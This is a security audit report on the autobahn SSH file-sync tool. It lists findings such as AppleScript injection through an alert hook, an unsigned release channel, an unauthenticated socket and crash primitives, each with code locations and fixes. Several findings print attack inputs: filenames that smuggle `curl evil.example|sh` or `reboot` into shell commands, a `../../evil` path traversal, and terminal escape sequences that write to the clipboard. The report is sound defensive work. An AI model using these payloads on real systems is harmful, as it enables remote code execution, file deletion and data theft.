# Security report — autobahn

**Date:** 2026-09-23
**Scope:** working tree at commit `1180499` (plus uncommitted local modifications)
**Product:** autobahn 0.4.0 — SSH-focused bidirectional file synchronization (Rust, single binary, optional macOS tray app)
**Method:** full read of `src/` (~1.5 MB), scripts, CI workflows, install/update paths; dependency inventory from `Cargo.lock`; claims below verified against source with file:line evidence.

## Threat model

- **Remote peer (beta/leader):** reached over SSH (`ssh <host> ~/.autobahn/bin/autobahn-<version> agent`). Authentication, confidentiality, and integrity of the wire protocol are inherited entirely from SSH — the protocol itself carries no MAC, no key exchange, no peer authentication beyond a magic + exact-version handshake (`src/transport/mod.rs:960-982`). A hostile *configured* host, a MITM'd SSH connection, or a planted agent binary is the assumed adversary for wire-level findings.
- **Local multi-user host:** other UIDs on machines running the supervisor, the peering leader, or CLI commands.
- **Release channel:** compromise of the GitHub repo/account/release pipeline (self-updater and installer trust it exclusively).
- **Not in scope:** the SSH user's own shell-equivalent privileges on a peer host are the trust floor — a peer with shell access can already read/write the synced tree.

## Executive summary

The sync engine's filesystem-write path is unusually well-defended: every transition path is component-validated, parent directories resolve with lstat-only symlink refusal, deletes are gated on last-scan expectations (digest + size/mtime/inode), creations use `RENAME_NOREPLACE`/`RENAME_EXCL`, staging is content-addressed and digest-verified, and case/Unicode collisions on folding volumes are probed and deduped. The frame decoder has cap-before-allocate discipline with an in-tree adversarial test suite. The control socket is hardened (0600, same-uid peer credentials, timeouts).

The serious problems are at the edges: a **remote-peer-to-local-RCE chain through the shipped alert hook** (AppleScript injection), an **unsigned release channel whose compromise is amplified to fleet-wide code execution** via the agent-bundle push, a **peering attach socket with no authentication** (the one place the protocol runs without SSH), and several hostile-peer **crash/OOM primitives** in the decoder's outer layers.

| # | Severity | Finding |
|---|----------|---------|
| H1 | High | AppleScript command injection via `AUTOBAHN_SUMMARY` in the shipped `on_alert` example — remote peer to local code execution |
| H2 | High | Release channel is unsigned; a channel compromise installs code on every controller **and every synced remote host** |
| M1 | Medium | Peering attach socket: no credential check, no 0600, no timeout, unbounded greeting — local impersonation of the alpha endpoint |
| M2 | Medium | Untrusted `u64` drives `Vec::with_capacity` — remote-triggered capacity-overflow abort of the controller |
| M3 | Medium | Unbounded recursion in snapshot deserialize/validate — stack overflow crash from a hostile peer |
| M4 | Medium | 4 GiB message-reassembly ceiling — memory exhaustion from a small wire footprint |
| M5 | Medium | Controller-chosen session identifier joined into filesystem paths unvalidated (including a `remove_dir_all`); undermines `is_pushable` containment |
| M6 | Medium | `install.sh` installs unverified binaries when SHA256SUMS is missing, and never verifies the agents tarball |
| M7 | Medium | Shell-metacharacter injection into remote `rm -f` during agent prune |
| M8 | Medium | Terminal escape-sequence injection from remote-controlled filenames (shop/pager/status) |
| L1–L9 | Low | See Low findings |

---

## High

### H1. AppleScript command injection through the shipped `on_alert` hook — remote peer to local code execution

**Where:** `src/config.rs:162-163` (`ON_ALERT_EXAMPLE`, written by `autobahn init`), executed by `src/alerts.rs:488-491` (`Command::new("sh").arg("-c").arg(command)`); summary composed at `src/alerts.rs:330-350` and `src/supervisor/mod.rs:1909` (`alert_summary` embeds `status.error`, which embeds peer-controlled filenames).

**Evidence:** the example hook's macOS fallback is:

```sh
exec /usr/bin/osascript \
    -e "display notification \"$AUTOBAHN_SUMMARY\" with title \"autobahn\""
```

Nothing escapes a `"` inside the *expanded* `$AUTOBAHN_SUMMARY`. The contrast case proves the fix shape: `src/tray.rs:785-790` escapes `\` and `"` before building the same kind of AppleScript.

**Attack:** a malicious/compromised beta creates a filename containing a quote, e.g. `x" & (do shell script "curl evil.example|sh") & "`. The name lands in a blocked/halted error string on the alpha (`blocked: <path>: unable to read file…`), the alert fires, the summary is interpolated into the AppleScript string, and osascript concatenates and **executes an arbitrary shell command as the local user**. Requires the user to keep the example hook (or write one with the same quoting) and terminal-notifier to be absent — both are default states on a stock macOS install.

**Fix:** escape `\` and `"` in `AUTOBAHN_SUMMARY`/`AUTOBAHN_DETAIL` at composition time (mirroring `tray.rs`), and/or change the example to pass the text via argv. Sanitizing at the composition boundary also covers any user-written hook with the same shape.

### H2. Unsigned release channel — channel compromise is fleet-wide code execution

**Where:** `src/update.rs:590-591` (download base `https://github.com/fny/autobahn/releases/latest/download`), `src/update.rs:116-128` (verification), `scripts/install.sh:62,80,110,113`.

**Evidence:** verification is only `verify(&staged_binary, ..., &sums)` where `SHA256SUMS` is fetched from the **same channel** as the binary. No signature, no pinned digest, no tag-immutability check. TLS (curl `-fsSL`/`wget`/`gh`) prevents MITM, so the exposure is specifically publisher/repo/pipeline compromise — the primary threat model for a self-updater.

**Attack:** an attacker who controls the repo or a release publishes a malicious `autobahn-<platform>` plus matching `SHA256SUMS`. Every machine running `autobahn update` downloads it, verifies it against the attacker's own checksums, smoke-runs it (`src/update.rs:446-451`), and restarts the login service onto it. The same release's `autobahn-agents.tar.gz` is then streamed by `transport::install::ensure_agent` to **every remote host in every session** and executed there — a single channel compromise becomes code execution on all synced hosts, not just controllers.

**Fix:** sign releases (minisign/cosign) and verify signatures in both `update.rs` and `install.sh`, or verify against a digest committed in the tagged source. The rollback machinery (`src/update.rs:209-268, 395-436`) is real but only protects against a *broken* binary, not a malicious one.

---

## Medium

### M1. Peering attach socket — no authentication, no hardening, unbounded greeting

**Where:** `src/supervisor/peer.rs:127-133` (`UnixListener::bind` with default umask — no `set_permissions(0o600)`, unlike the control socket), `peer.rs:206-226` (`accept_attachment`: unbounded `read_line`, authentication is the plaintext greeting `alpha`, no `SO_PEERCRED`/`getpeereid` check, no read timeout).

**Attack:** the attach socket is the one place the wire protocol runs **without SSH**. On a multi-user host running a peering leader, a local process that can connect (guaranteed under a permissive umask; under the usual 022 the socket is 0755 and connect happens to require write — safe by accident, not by design) greets `alpha` and becomes the alpha-side endpoint: the leader streams synchronized file content to the attacker (cross-UID exfiltration) and accepts attacker-chosen scans into the session — in deletion-propagating modes, a fabricated "deleted on alpha" report destroys the leader's local files. Independently, an unterminated greeting line wedges the single acceptor thread (peering DoS) and grows memory without bound.

**Fix:** mirror `src/supervisor/control.rs:268-277, 306-337` — chmod 0600, same-uid credential check, read timeout, greeting length cap. The control socket already demonstrates the correct pattern in the same file tree.

### M2. Untrusted `u64` drives `Vec::with_capacity` — capacity-overflow abort

**Where:** `src/endpoint/remote.rs:219` — `let mut output = Vec::with_capacity(header.length as usize);` where `header.length` is a `u64` taken verbatim from the agent's `ScanDelta` header before any data arrives.

**Attack:** a hostile agent declaring `length = u64::MAX` (or any value that overflows on this platform) makes `with_capacity` abort with an uncatchable capacity-overflow; the post-hoc guard at `remote.rs:233` never runs. One frame kills the whole controller process. Requires a hostile configured host or SSH MITM (see L1).

**Fix:** cap `header.length` (≤ `MAXIMUM_MESSAGE_SIZE`) before the allocation, or use `try_reserve`.

### M3. Unbounded recursion in snapshot deserialize/validate — stack overflow

**Where:** `src/tree/mod.rs:341-381` (`Node::validate` recurses per level), `src/endpoint/remote.rs:240-246` (`bincode::deserialize` then `validate` on agent-controlled bytes). bincode 1.3 (`Cargo.toml:10`) has no depth limit.

**Attack:** a hostile agent sends a snapshot nested millions of levels deep (a few bytes per level); deserialization or validation overflows the stack — uncatchable SIGSEGV, controller killed. Crash-only.

**Fix:** depth counter during deserialization or a depth cap in `validate`.

### M4. 4 GiB message-reassembly ceiling — memory exhaustion from a small wire footprint

**Where:** `src/transport/mod.rs:1017` (`MAXIMUM_MESSAGE_SIZE = 4 GiB`), `read_frame`/`read_chunk` (`mod.rs:1173-1261`) reassemble chunked messages up to that cap; each ≤64 MiB frame may be LZ4-expanded from a small compressed body.

**Attack:** a hostile peer sends ~64 compressed 64 MiB chunks (a few MB on the wire) → the receiver allocates 4 GiB before `bincode::deserialize` rejects it. Symmetric controller→agent. Per-frame bounds are good (see Verified-safe); the aggregate bound is a memory bomb behind an authenticated channel. DoS only.

**Fix:** a saner aggregate ceiling (snapshot messages are bounded by `max_entry_count` in real configs), or accounting reassembled size against a session-scoped budget.

### M5. Controller-chosen session identifier joined into paths unvalidated — containment bypass

**Where:** `src/protocol.rs:41-42` (`Initialize.session` is an arbitrary controller-supplied `String`), `src/transport/mod.rs:885-886` — `staging_area.join(&initialize.session)` passed to `remove_dir_all`, and `staging_area.join(format!("{}-{}", initialize.session, initialize.side))`; also `src/peering.rs:290-292` (`AncestorCopy` paths `.join(session)`).

**Attack:** a controller sending `session = "../../evil"` escapes `~/.autobahn/staging` and `~/.autobahn/peering/ancestors` — note line 885 routes the same string into **`remove_dir_all`**, converting a peer's sync authority into arbitrary-path deletion/writes under the agent user's home (e.g. `~/.ssh/config` via a crafted staging write). This directly undermines the otherwise strict `is_pushable` containment (`src/peering.rs:220-243` refuses `..`, `/`, nested paths — session identifiers bypass it entirely). Reachability: normally the session id is a BLAKE3 hex digest or a config group name (user's own config — trusted), but in peering a **leader-pushed config** names the groups (see L4), so a malicious leader can choose the string.

**Fix:** validate `Initialize.session` at the agent boundary (reject empty, `/`, `..`, and any non-`Component::Normal` segment), exactly as `validate_path` does for transition paths.

### M6. `install.sh` installs unverified binaries; agents tarball never verified on that path

**Where:** `scripts/install.sh:146-148` — when the `SHA256SUMS` fetch fails for *any* reason, the unverified binary is `chmod 755`'d and installed with only a warning. `scripts/install.sh:162-174` — `autobahn-agents.tar.gz` is extracted into `~/.autobahn/agents` with **no** checksum comparison at any point (only `autobahn-$PLATFORM` is checked); `src/update.rs:127` does verify it, so the two paths diverge and the weaker one is the one new users run first.

**Attack:** removing or failing the checksums asset server-side lets a tampered binary install silently; a tampered agents tarball installs unobserved and is later streamed to and executed on every remote host of a different platform by `ensure_agent` (`src/transport/install.rs:44-58`). The agent binaries are the highest-blast-radius assets and get the weakest check on the first-install path.

**Fix:** refuse like `update.rs:116-118` does; verify the agents tarball against `SHA256SUMS`.

### M7. Shell-metacharacter injection into remote `rm -f` during agent prune

**Where:** `src/transport/install.rs:299` (filter is only `starts_with("autobahn-") && !contains('/')`) and `:318` — `let script = format!("rm -f {names}")`, executed via the remote login shell.

**Attack:** a file named `autobahn-$(curl evil|sh)` or `autobahn-x; reboot` in the remote `~/.autobahn/bin` survives the filter and is executed as the remote user at the next prune. The comment's own claim ("only well-formed agent names are ever considered") is not enforced — spaces, metacharacters, and newlines all pass. Prerequisites temper severity: planting the file already requires write access to that user's home directory (not a privilege escalation), but it is unquoted shell interpolation of directory-listing output.

**Fix:** reject names outside `[A-Za-z0-9._-]` and single-quote each name in the `rm` command.

### M8. Terminal escape-sequence injection from remote-controlled filenames

**Where:** `src/shop.rs:1500-1530` (`width`/`shorten` treat `\x1b` runs as zero-width and **keep** them), `shop.rs:1095-1099` (`strip()` sanitizes only the *selected* row), `src/pager.rs:142-170` (`truncate` "leaving its escape sequences intact"), `src/main.rs:1766-1780` (status prints conflict/blocked paths verbatim).

**Attack:** a malicious peer syncs a file whose name carries CSI/OSC sequences (e.g. OSC 52 `\x1b]52;c;<base64>\x07` clipboard write, OSC 8 hyperlinks, cursor repositioning). When the alpha user runs `status`, `status --live`, or the shop, the sequences are emitted to their terminal: clipboard exfiltration in supporting terminals, screen spoofing, forged UI. The escape-preserving width logic exists so autobahn's own colors survive; it equally passes attacker ESC sequences embedded in filenames.

**Fix:** neutralize control characters (at minimum ESC) in any string originating from the tree/status report at the report boundary; keep escape-preserving width logic only for autobahn-generated color.

---

## Low

**L1. Host-key policy fully delegated to the user's ssh config.** `src/transport/mod.rs:73-84` sets BatchMode/keepalives/Compression but no `StrictHostKeyChecking` policy. Fail-closed by default (OpenSSH `ask` + `BatchMode=yes` refuses unknown hosts rather than accepting), but a user-level `~/.ssh/config` with `StrictHostKeyChecking no` silently removes all MITM protection, making M2/M3/M4 network-triggerable. Same posture as rsync/git-over-ssh; consider documenting or pinning per destination.

**L2. World-readable state under default umask.** `src/persist.rs:226-234` (`write_atomically` — no explicit mode), status JSONs (`src/supervisor/mod.rs:2281-2285`), `~/.autobahn/service.log` (`src/service.rs:38-39`), peering state (`src/peering.rs:246-268`) — typically 0644/0755. On a shared machine other local users can enumerate synced host names, paths, sizes, digests, and error text (including the H1 quote-bearing strings). The control socket and *synced file* defaults are correctly hardened (0600/0700); the state root itself is not. Confidentiality-only. Fix: 0700 the state root, 0600 the files.

**L3. `/tmp` diff scratch disclosure + predictable temp names.** `src/main.rs:2064-2090` writes both sides of a diff into `/tmp/autobahn-diff-<pid>/` at umask default (0644) — any local user can read the content of whatever file the user chose to diff; the predictable name allows pre-planting to capture/redirect writes. `src/persist.rs:227` (`tmp.<pid>`) and `src/tray.rs:727-736` share the predictable-name pattern (safe inside the owner-only state root; exploitable if `AUTOBAHN_HOME` points at a group-writable location). Fix: 0700 dir with O_EXCL semantics (or `tempfile`), 0600 files.

**L4. Follower executes a leader-pushed configuration defining its local sync roots.** `src/peering.rs:448-560` (`derive_star` parses the leader's TOML into follower plans), `src/supervisor/peer.rs:55-70,121-124`. A malicious leader can widen which local paths a follower synchronizes. Real mitigations exist: non-peering groups are dropped, and the follower supervisor is built **without** `with_alerts` and **without** `with_reload` — a pushed `on_alert` shell hook never executes on a follower (`peer.rs:119-125`). Exposed surface is roots+modes, not command execution; inherent to the documented Experimental peering trust model, but it is the reachability path for M5.

**L5. Lease fence is cooperative, not enforced.** `src/transport/mod.rs:537,552-589` — the agent-side fence is set only by a *refused* `Request::Lease`; a controller that simply omits the Lease request applies transitions, pushes ancestor records/checkpoints, and writes pushed peering files without holding any lease. The "no root is ever written by two controllers" guarantee holds only against well-behaved controllers. Within the SSH trust model this is by design (ordinary sessions also write without leases), but the peering safety argument reads as host-enforced when it is not.

**L6. Control-socket fallback in shared `/tmp`, hardening best-effort.** `src/supervisor/control.rs:239-252, 264-267` — the fallback parent `<TMPDIR>/autobahn-<uid>` is chmod'd 0700 with errors ignored; an attacker-owned pre-created directory lets them unlink/replace the socket and spoof/DoS CLI control connections. The same-uid credential check (`control.rs:355-357`) prevents forging the peer, so this is spoofing/DoS of the convenience surface only. The common case (socket inside the user-owned state root) is safe.

**L7. `curl | sh` installs from an unpinned branch HEAD; tar extraction without in-repo sanitization.** `scripts/install.sh:6` documents the one-liner against `main` — whatever the branch holds at fetch time runs as the user. Modern tar refuses absolute/`..` members by default, but no in-repo defense exists for the agents bundle (`scripts/install.sh:166`, `src/update.rs:336-341`). Standard-pattern risk; no `sudo` anywhere in the script (installs only to user-writable paths), which limits blast radius.

**L8. PATH-resolved helpers and unbounded held lines.** Clipboard helpers (`src/shop.rs:801-830`: `pbcopy`/`wl-copy`/`xclip` via PATH) and the tray notifier (`src/tray.rs:848-860`) can be hijacked by a group-writable early PATH entry — argv-only, no shell, standard PATH trust. `StderrRelay` (`src/transport/mod.rs:114,136`) caps the *count* of held lines (64) but not their length — a hostile agent can park one multi-gigabyte "line" in controller memory pre-handshake.

**L9. Robustness nits.** `.expect` on poisonable locks (`src/transport/mux.rs:160-162`) inconsistent with the `into_inner` pattern used elsewhere in the same file; unquoted home-relative remote command path (`src/transport/install.rs:31-32`) is safe today only because `protocol::version()` is a compile-time constant — a guard asserting the version matches `[0-9A-Za-z._+-]+` would make that invariant explicit. Log forging: filenames containing `\n` forge timestamped lines in `service.log` (`src/logging.rs:96-127`); no parser consumes it.

---

## Verified safe (evidence-backed non-findings)

**Filesystem writes cannot escape the sync root.** `validate_path`/`validate_name` (`src/endpoint/local.rs:3039-3062`) reject empty/`.`/`..`/separator/NUL per component at every transition (`local.rs:1856-1873`, regression tests at `local.rs:4811-4818`, e2e at `4082-4104`); wire snapshots are structurally validated on reassembly (`src/endpoint/remote.rs:242-246`, `Node::validate` at `src/tree/mod.rs:341-390`); `resolve_relative` (`local.rs:2861-2871`) refuses non-`Component::Normal` paths for `read_file`/`rename`. Defense-in-depth gap: four staging/supply call sites join wire paths without `resolve_relative` (`local.rs:757, 840, 965, 1195`) — read-only escape under the same SSH trust, worth routing through the guard.

**Symlinks are never followed on the write/delete path.** Parent descent is `symlink_metadata`-only (`resolve_parent`/`verify_directory`, `local.rs:1882-1908, 3015-3022`); deletes require digest + exact size/mtime/inode match for files and target equality for links (`local.rs:2362-2422`); a leaf swapped to a symlink is unlinked as a link, never followed; `SymlinkMode::Portable` confines targets to the root and rejects colons (`src/scan/mod.rs:180-200`).

**Deletes are expectation-gated.** `remove_directory` (`local.rs:2410-2540`) refuses any on-disk entry not accounted for by the expectation or recorded untracked set; root deletion and root replacement are refused outright (`local.rs:4093-4095, 2564-2572`). `tree/apply.rs` is memory-only.

**Case/Unicode collisions handled.** Empirical per-volume probing (`src/scan/probes.rs`), fold-key dedup on creation (`local.rs:1021-1072`), delete-before-create ordering for case-only renames (`local.rs:1444-1467`), NFD→NFC recomposition on matching volumes (`local.rs:2457-2465`). A peer sending `a`/`A` twins on a folding volume gets a refusal-problem, not a silent replace.

**Frame decoder is disciplined.** Length prefix checked against the cap **before** allocation; LZ4 output capped at 64 MiB before decompression (bounding bombs); in-tree adversarial suite covers random input, truncation at every offset, over-cap prefixes, bombs, unknown flags (`src/transport/mod.rs:1259-1428`). Mux routing fails closed on unsolicited/duplicate responses and channel-id exhaustion (`src/transport/mux.rs:167-222, 316-325`); channel ids are opaque keys, never trusted indices.

**rsync is in-process.** `src/rsync/mod.rs` is a pure delta algorithm over `Read`/`Write` — no process spawn, no shell, no filenames in argv; signatures validated before use; block ranges bounds-checked before any I/O (`rsync/mod.rs:60-105, 361-371`).

**Control socket is hardened.** 0600 socket + 0700 parent (`src/supervisor/control.rs:268-277`), same-uid peer credentials via `SO_PEERCRED`/`getpeereid` (`control.rs:306-337`), 2-second I/O timeouts, shallow flag-flip requests only. No TCP/HTTP/port anywhere.

**No privilege elevation, ever.** macOS LaunchAgent in `gui/<uid>`; Linux `systemd --user` + linger (`src/service.rs:222-225, 409-476`). No root, no setuid, no daemonization. No sandbox is claimed or present.

**SSH invocation has no argument-injection vector.** argv arrays throughout; `--` terminator before the destination so a `-`-prefixed host cannot become an ssh option such as `ProxyCommand` (`src/transport/mod.rs:289-292`, `src/transport/install.rs:364-369`, pinned by test). `AUTOBAHN_SSH` is a user-environment customization hook, same trust as PATH.

**Remote agent install script is fixed-format.** Only compile-time `version` and a measured `length` are interpolated; byte-count check prevents publishing truncated binaries; atomic `mv` publish (`src/transport/install.rs:207-221`).

**Updater is fail-closed with rollback where it does verify.** Refuses missing checksums (`update.rs:116-118`), whole-name checksum matching (no prefix confusion, `update.rs:498-512`), atomic rename keeping `autobahn.previous`, service restart confirmed by polling, restore on failure (`update.rs:209-268, 395-436`). Note the smoke-run at `update.rs:446-451` executes downloaded code before install — no additional exposure beyond H2, but the "verified before it runs" narrative means *checksum-verified*, not *signature-verified*.

**Reload path refuses invalid edits.** Byte-compare double-read before applying (`src/supervisor/reload.rs:170-190`), startup-identical validation, refused edits keep old plans running, pending configs applied only after workers halt. `deny_unknown_fields` on every config table.

**Peering push containment.** `is_pushable` whitelists file names and rejects `..`/absolute (`src/peering.rs:220-243`); ignore files are namespaced; pushed `on_alert` never executes on followers. The bypass is M5 (session ids), not the whitelist itself.

**No secrets in the repository.** CI secrets are GitHub-masked and confined to the protected, approval-gated `release` environment; fork PRs never receive them; the signing keychain and notary key are deleted in an `if: always()` step (`.github/workflows/release.yml:117-160`). Workflows use pinned `actions/@v4`-style tags, no `pull_request_target`, no untrusted-checkout injection vectors found. Committing `bench/harness/target` build droppings (538 files) is hygiene noise, not a security issue.

**Dependency surface is minimal.** No TLS/HTTP crates in the binary (networking delegated to `ssh`/`curl`/`wget`/`gh`); lockfile has no crate known to carry an active advisory at audit date (bincode 1.3.3, lz4_flex 0.11.6, notify 6.1.1, toml 0.8.2, serde_json 1.0.151 — no cargo-audit RUSTSEC hits at current versions; advisory database not consulted live, so treat as a manual review, not an audit). `unsafe` usage is confined to well-understood libc calls (isatty, flock, termios, getpwnam/getgrnam, statfs, renameat2/renamex_np, peer credentials) — no unsafe code handles remote data.

---

## Recommended priorities

1. **H1:** escape `\` and `"` in `AUTOBAHN_SUMMARY`/`AUTOBAHN_DETAIL` at composition; fix the example hook. Small diff, removes a remote-peer RCE.
2. **H2 + M6:** sign releases and verify signatures in both `update.rs` and `install.sh`; make `install.sh` refuse unverified; verify the agents tarball. The agent-push path makes this the highest-blast-radius trust gap.
3. **M1:** harden the attach socket exactly like the control socket (0600, same-uid credentials, timeout, greeting cap).
4. **M5:** validate `Initialize.session` at the agent boundary (it also feeds `remove_dir_all`).
5. **M2/M3/M4:** cap `ScanDelta.length` before `with_capacity`; add a depth limit to snapshot validation; lower or budget the 4 GiB reassembly ceiling.
6. **M7:** quote and charset-restrict pruned agent names.
7. **M8:** strip control characters from report-boundary strings.
8. **L2/L3:** 0700 the state root, 0600 state files, private diff scratch.
